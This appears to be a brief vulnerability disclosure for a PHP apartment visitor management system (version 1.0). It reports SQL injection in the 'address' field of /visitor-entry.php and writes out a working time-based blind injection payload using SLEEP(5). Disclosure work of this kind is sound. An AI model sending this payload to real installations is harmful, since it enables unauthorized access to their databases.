# The apartment visitor management system has SQL injection vulnerability

## Vulnerability author:liuyuanyuan

supplier:
https://www.sourcecodester.com/php-apartment-visitor-management-system-source-code

edition: 
1.0

/visitor-entry.php

SQL injection exists in the address parameter

Payload: visname=123123&address=123123' AND (SELECT 1198 FROM (SELECT(SLEEP(5)))YVgG) AND  'aGvp'='aGvp&apartmentno=Choose....&whomtomeet=123123&mobilenumber=123123123&gender=Choose&buildingno=&reason=123123&submit=

![image](https://github.com/user-attachments/assets/10508ea9-c429-4933-b98c-e5b1019982e5)

![image](https://github.com/user-attachments/assets/79328a9b-911c-4edd-a1c3-ac66f0f77762)
